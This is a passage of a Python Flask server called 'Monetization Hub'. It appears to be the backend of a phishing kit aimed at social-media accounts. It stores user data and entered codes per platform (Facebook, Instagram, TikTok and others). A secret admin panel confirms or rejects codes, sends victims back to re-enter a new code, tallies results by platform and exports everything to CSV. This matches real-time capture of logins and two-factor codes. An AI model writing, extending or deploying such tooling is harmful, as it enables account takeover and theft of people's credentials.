        conn.execute('UPDATE submissions SET rejected = 1, confirmed = 0 WHERE id = ?', (submission_id,))
        conn.commit()
    return jsonify({'success': True})

# FIXED: Request new code endpoint with proper navigation
@app.route('/api/request_new_code/<int:submission_id>', methods=['POST'])
def api_request_new_code(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        # Mark that user requested a new code
        conn.execute('UPDATE submissions SET resend_requested = 1 WHERE id = ?', (submission_id,))
        
        # Get platform info and page for redirect
        submission = conn.execute(
            'SELECT platform_name, page FROM submissions WHERE id = ?', (submission_id,)
        ).fetchone()
        
        conn.commit()
    
    if submission:
        platform = submission[0] or 'Unknown'
        current_page = submission[1] or ''
        
        # FIXED: Determine which page to redirect back to based on current page
        redirect_url = get_previous_code_page(current_page, platform)
        return jsonify({'success': True, 'redirect_url': redirect_url})
    
    return jsonify({'success': False, 'error': 'Submission not found'})

def get_previous_code_page(current_page, platform):
    """Determine which page to send user back to based on current page and platform"""
    # Map current pages to their previous code entry pages
    page_mapping = {
        'joy1_2': '/joy1_2',
        'joy1_3': '/joy1_2',
        'joy2_2': '/joy2_2', 
        'joy2_3': '/joy2_2',
        'happy1_2': '/happy1_2',
        'happy1_3': '/happy1_2',
        'happy2_2': '/happy2_2',
        'happy2_3': '/happy2_2',
        'love1_2': '/love1_2',
        'love1_3': '/love1_2',
        'love2_2': '/love2_2',
        'love2_3': '/love2_2',
        'f1_A': '/f1_A',
        'f2_A': '/f2_A'
    }
    
    # For common pages, add platform parameter
    if current_page in ['f1_A', 'f2_A']:
        return f"{page_mapping.get(current_page, '/')}?platform={platform}"
    
    return page_mapping.get(current_page, '/')

# UPDATED: Admin route with statistics calculation
@app.route(f"/admin/{ADMIN_SECRET}")
def admin():
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute(
            'SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested FROM submissions ORDER BY id DESC'
        ).fetchall()
    
    # Calculate statistics
    total_submissions = len(rows)
    
    # Code statistics
    pending_codes_count = sum(1 for row in rows if row[6] and not row[7] and not row[9])
    confirmed_codes_count = sum(1 for row in rows if row[6] and row[7])
    rejected_codes_count = sum(1 for row in rows if row[6] and row[9])
    resend_requests_count = sum(1 for row in rows if row[10])
    total_codes_count = sum(1 for row in rows if row[6])
    
    # Platform statistics
    facebook_count = sum(1 for row in rows if row[8] == 'Facebook')
    instagram_count = sum(1 for row in rows if row[8] == 'Instagram')
    tiktok_count = sum(1 for row in rows if row[8] == 'TikTok')
    youtube_count = sum(1 for row in rows if row[8] == 'YouTube')
    snapchat_count = sum(1 for row in rows if row[8] == 'Snapchat')
    twitter_count = sum(1 for row in rows if row[8] in ['X / Twitter', 'Twitter'])
    
    return render_template('admin.html', 
                         submissions=rows, 
                         secret=ADMIN_SECRET,
                         pending_codes_count=pending_codes_count,
                         confirmed_codes_count=confirmed_codes_count,
                         rejected_codes_count=rejected_codes_count,
                         resend_requests_count=resend_requests_count,
                         total_codes_count=total_codes_count,
                         facebook_count=facebook_count,
                         instagram_count=instagram_count,
                         tiktok_count=tiktok_count,
                         youtube_count=youtube_count,
                         snapchat_count=snapchat_count,
                         twitter_count=twitter_count)

@app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
def admin_clear():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('DELETE FROM submissions')
        conn.commit()
    flash('All submissions cleared.')
    return redirect(url_for('admin'))

@app.route(f"/admin/{ADMIN_SECRET}/download")
def download():
    csv_path = 'submissions_export.csv'
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute('SELECT id, timestamp, page, user, data FROM submissions ORDER BY id DESC').fetchall()
    with open(csv_path, 'w', newline='', encoding='utf-8') as csvf:
        writer = csv.writer(csvf)
        writer.writerow(['id','timestamp','page','user','data'])
        writer.writerows(rows)
    return send_file(csv_path, as_attachment=True)

# ========== NEW: Health check route ==========
@app.route('/health')
def health():
    """Health check endpoint to verify server is running"""
    screenshots_exist, missing = check_screenshots_exist()
    return jsonify({
        'status': 'healthy',
        'server_time': datetime.utcnow().isoformat(),
        'database': 'ok' if os.path.exists(DB_FILE) else 'missing',
        'screenshots': 'complete' if screenshots_exist else f'missing {len(missing)} images',
        'missing_images': missing if missing else None
    })

if __name__ == '__main__':
    # Create necessary folders if they don't exist
    os.makedirs('static/images', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    print("=" * 50)
    print("Monetization Hub - Flask Server Starting")
    print("=" * 50)
    
    # Check if images exist
    screenshots_exist, missing_images = check_screenshots_exist()
    
    if screenshots_exist:
        print("✓ All 5 screenshot images found in static/images/")
    else:
        print(f"⚠ Warning: {len(missing_images)} screenshot images missing:")
        for image in missing_images:
            print(f"  - {image}")
        print("  Please add these images to static/images/ folder")
    
    print(f"✓ Database file: {DB_FILE}")
    print(f"✓ Static folder: {app.static_folder}")
    print(f"✓ Template folder: {app.template_folder}")
    print("=" * 50)
    print("Server is running...")
    print(f"Access the site at: http://localhost:{os.environ.get('PORT', 5000)}")
    print("Test images at: http://localhost:{os.environ.get('PORT', 5000)}/test-images")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)
